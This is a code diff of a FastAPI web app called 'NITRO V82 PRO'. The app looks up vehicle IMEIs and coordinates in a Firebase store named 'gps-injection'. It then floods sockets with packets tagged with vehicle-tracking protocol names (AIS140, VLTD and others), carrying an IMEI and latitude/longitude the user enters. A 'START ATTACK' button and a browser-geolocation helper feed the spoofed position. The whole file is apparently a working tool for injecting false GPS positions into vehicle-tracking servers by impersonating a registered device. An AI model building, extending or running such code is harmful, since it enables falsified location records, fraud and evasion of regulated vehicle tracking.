@@ -5,8 +5,7 @@ from fastapi.responses import HTMLResponse
 
 app = FastAPI()
 
-# --- 🚀 NAYA TARIKA: DIRECT REST API (NO SDK) ---
-# Isme kisi JSON file ya initialize_app() ki zaroorat nahi hai
+# --- 🚀 REST API LOGIC (LOCKED - NO CHANGES) ---
 DB_URL = "https://ghop-ghop-gps-injection-default-rtdb.firebaseio.com"
 
 firing = False
@@ -18,37 +17,28 @@ TAGS = ["RA18", "WTEX", "MARK", "ASPL", "LOCT14A", "ACT1", "AIS140", "VLTD", "AM
 def fetch_data(vno: str):
     v_up = vno.upper().strip()
     try:
-        # Direct REST GET Request
         response = requests.get(f"{DB_URL}/Data_Records/{v_up}.json")
         data = response.json()
         if data:
             return {"found": True, "imei": data.get('IMEI_No',''), "lat": data.get('Lat',''), "lon": data.get('Lon','')}
-    except Exception as e:
-        return {"found": False, "err": "REST_API_FAIL"}
+    except: pass
     return {"found": False, "err": "NOT_IN_DB"}
 
 @app.get("/init")
 def init(v:str, i:str, lt:str, ln:str):
-    global firing, total_sent, logs
+    global firing, total_sent
     if not firing:
         v_up = v.upper().strip()
         firing, total_sent = True, 0
-        logs = [f"<span style='color:#fff'>[SYS] TARGET LOCKED: {v_up}</span>"]
-        
-        # Direct REST PUT Request (Data Save karne ke liye)
         payload = {"IMEI_No": i, "Lat": lt, "Lon": ln, "Status": "Active"}
-        try:
-            requests.put(f"{DB_URL}/Data_Records/{v_up}.json", json=payload)
-            logs.append("<span style='color:#0f0'>[DB] REST_SYNC: SUCCESS</span>")
-        except:
-            logs.append("<span style='color:#f00'>[DB] REST_SYNC: FAILED</span>")
-        
+        try: requests.put(f"{DB_URL}/Data_Records/{v_up}.json", json=payload)
+        except: pass
         for tag in TAGS:
             threading.Thread(target=handshake_worker, args=(tag,i,v_up,lt,ln), daemon=True).start()
     return {"ok": True}
 
 def handshake_worker(tag, imei, vno, lat, lon):
-    global firing, total_sent, logs
+    global firing, total_sent
     while firing:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -60,59 +50,117 @@ def handshake_worker(tag, imei, vno, lat, lon):
             s.sendall(bytes(pkt, 'ascii'))
             total_sent += 1
             s.close()
-            logs.append(f"<span style='color:#0f0'>[{tm}] {tag} OK</span>")
-            if len(logs) > 10: logs.pop(0)
             time.sleep(0.1)
         except: time.sleep(1)
 
 @app.get("/status")
-def status(): return {"c": total_sent, "l": logs}
+def status(): return {"c": total_sent, "f": firing}
 
 @app.get("/stop")
 def stop(): global firing; firing = False; return {"ok": True}
 
+# --- 🎨 NEW UI WITH MAP & PROGRESS BAR ---
 @app.get("/", response_class=HTMLResponse)
 async def home():
     return """
-    <html><head><title>NITRO V82 PRO</title><style>
-    body { background:#000; color:#0f0; font-family:monospace; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; overflow:hidden; }
-    .box { width:400px; border:2px solid #0f0; padding:25px; background:rgba(0,10,0,0.98); border-radius:15px; box-shadow: 0 0 20px #0f0; text-align:center; }
-    input { width:100%; background:#000; border:1px solid #333; color:#0f0; padding:12px; outline:none; text-transform:uppercase; margin-top:8px; font-family:monospace; }
-    button { width:100%; padding:15px; margin-top:15px; cursor:pointer; border:1px solid #0f0; background:transparent; color:#0f0; font-weight:bold; }
-    button:hover { background:#0f0; color:#000; }
-    #log { height:180px; background:#000; border:1px solid #222; margin-top:15px; padding:10px; font-size:11px; overflow-y:auto; line-height:1.5; }
+    <html><head><title>NITRO V82 PRO | MASTER</title>
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <style>
+        body { background:#000; color:#0f0; font-family:monospace; margin:0; display:flex; flex-direction:column; align-items:center; height:100vh; overflow:hidden; }
+        .box { width:420px; border:2px solid #0f0; padding:20px; background:rgba(0,10,0,0.9); border-radius:15px; box-shadow: 0 0 20px #0f0; z-index:10; margin-top:20px; }
+        input { width:100%; background:#000; border:1px solid #333; color:#0f0; padding:10px; margin-top:8px; outline:none; text-transform:uppercase; }
+        button { width:100%; padding:12px; margin-top:10px; cursor:pointer; border:1px solid #0f0; background:transparent; color:#0f0; font-weight:bold; }
+        .btn-loc { background:#003300; border-color:#0f0; font-size:10px; padding:5px; }
+        #map { width:100%; height:250px; margin-top:15px; border:1px solid #0f0; border-radius:10px; filter: invert(100%) hue-rotate(180deg) brightness(95%) contrast(90%); }
+        .progress-container { width:100%; height:10px; background:#111; margin-top:15px; border-radius:5px; overflow:hidden; display:none; border:1px solid #0f0; }
+        #progress-bar { width:0%; height:100%; background:linear-gradient(90deg, #0f0, #00ff00); box-shadow: 0 0 10px #0f0; transition: width 0.3s; }
+        .stats { display:flex; justify-content:space-between; margin-top:10px; font-weight:bold; font-size:14px; }
     </style></head><body>
     <div class="box">
-        <h2 style="letter-spacing:4px;">NITRO V82 PRO</h2>
-        <input type="text" id="v" oninput="this.value=this.value.toUpperCase()" onblur="fetchData()" placeholder="VEHICLE NO">
+        <h2 style="text-align:center;margin:0;letter-spacing:4px;">NITRO V82 PRO</h2>
+        <input type="text" id="v" onblur="fetchData()" placeholder="VEHICLE NUMBER">
         <input type="text" id="i" placeholder="IMEI">
-        <div style="display:flex;gap:5px;"><input type="text" id="lt" placeholder="LAT"><input type="text" id="ln" placeholder="LON"></div>
-        <button onclick="st()" style="background:#0f0; color:#000;">START ATTACK</button>
-        <button onclick="sp()" style="color:red;border-color:red;">STOP</button>
-        <button onclick="location.reload()" style="color:yellow;border-color:yellow;font-size:10px;">RESET SYSTEM</button>
-        <div id="log">READY...</div>
-        <div style="margin-top:10px; display:flex; justify-content:space-between; font-weight:bold;"><span>SENT: <b id="c">0</b></span><span id="st" style="color:lime">IDLE</span></div>
+        <div style="display:flex;gap:5px;">
+            <input type="text" id="lt" placeholder="LAT">
+            <input type="text" id="ln" placeholder="LON">
+        </div>
+        <button class="btn-loc" onclick="getLocation()">[ GET CURRENT LOCATION ]</button>
+        <button onclick="st()" id="startBtn" style="background:#0f0; color:#000;">START ATTACK</button>
+        <button onclick="sp()" style="color:red;border-color:red;">ABORT</button>
+        
+        <div class="progress-container" id="p-cont"><div id="progress-bar"></div></div>
+        
+        <div id="map"></div>
+        
+        <div class="stats">
+            <span>SENT: <b id="c" style="color:#fff">0</b></span>
+            <span id="st" style="color:lime">IDLE</span>
+        </div>
     </div>
+
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <script>
-        let m;
-        function fetchData() {
-            let v = document.getElementById('v').value.trim();
-            if(v.length > 4) {
-                document.getElementById('log').innerHTML += `<br>[SYS] REST_FETCHING ${v}...`;
-                fetch(`/fetch_data?vno=${v}`).then(r=>r.json()).then(d=>{
-                    if(d.found) {
-                        document.getElementById('i').value=d.imei; document.getElementById('lt').value=d.lat; document.getElementById('ln').value=d.lon;
-                        document.getElementById('log').innerHTML += "<br><span style='color:lime'>[SUCCESS] DB_LOADED</span>";
-                    } else { document.getElementById('log').innerHTML += `<br><span style='color:red'>[FAIL] ${d.err}</span>`; }
-                    var l=document.getElementById("log"); l.scrollTop=l.scrollHeight;
+        let map = L.map('map').setView([20.5937, 78.9629], 5);
+        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
+        let marker = L.marker([20.5937, 78.9629]).addTo(map);
+
+        let mon;
+        function updateMap(lt, ln) {
+            let lat = parseFloat(lt); let lon = parseFloat(ln);
+            if(lat && lon) {
+                map.setView([lat, lon], 13);
+                marker.setLatLng([lat, lon]);
+            }
+        }
+
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(pos => {
+                    document.getElementById('lt').value = pos.coords.latitude.toFixed(6);
+                    document.getElementById('ln').value = pos.coords.longitude.toFixed(6);
+                    updateMap(pos.coords.latitude, pos.coords.longitude);
                 });
             }
         }
-        function st() {
-            fetch(`/init?v=${document.getElementById('v').value}&i=${document.getElementById('i').value}&lt=${document.getElementById('lt').value}&ln=${document.getElementById('ln').value}`);
-            document.getElementById('st').innerText="RUNNING";
-            if(!m) m = setInterval(() => { fetch('/status').then(r=>r.json()).then(d=>{ document.getElementById('c').innerText=d.c; document.getElementById('log').innerHTML=d.l.join("<br>"); var l=document.getElementById("log"); l.scrollTop=l.scrollHeight; }); }, 1000);
+
+        function fetchData() {
+            let v = document.getElementById('v').value.trim();
+            if(v.length > 4) {
+                fetch(`/fetch_data?vno=${v}`).then(r=>r.json()).then(d=>{
+                    if(d.found) {
+                        document.getElementById('i').value=d.imei;
+                        document.getElementById('lt').value=d.lat;
+                        document.getElementById('ln').value=d.lon;
+                        updateMap(d.lat, d.lon);
+                    }
+                });
+            }
         }
-        function sp() { fetch('/stop'); clearInterval(m); m=null; document.getElementById('st').innerText="IDLE"; }
+
+        function st() {
+            let v = document.getElementById('v').value;
+            let i = document.getElementById('i').value;
+            let lt = document.getElementById('lt').value;
+            let ln = document.getElementById('ln').value;
+            fetch(`/init?v=${v}&i=${i}&lt=${lt}&ln=${ln}`);
+            document.getElementById('st').innerText="FIRING";
+            document.getElementById('st').style.color="red";
+            document.getElementById('p-cont').style.display="block";
+            if(!mon) mon = setInterval(() => {
+                fetch('/status').then(r=>r.json()).then(d=>{
+                    document.getElementById('c').innerText = d.c;
+                    let prog = (d.c % 100); // Progress bar loop animation
+                    document.getElementById('progress-bar').style.width = prog + "%";
+                });
+            }, 1000);
+        }
+
+        function sp() {
+            fetch('/stop');
+            clearInterval(mon); mon=null;
+            document.getElementById('st').innerText="IDLE";
+            document.getElementById('st').style.color="lime";
+            document.getElementById('p-cont').style.display="none";
+        }
     </script></body></html>
     """
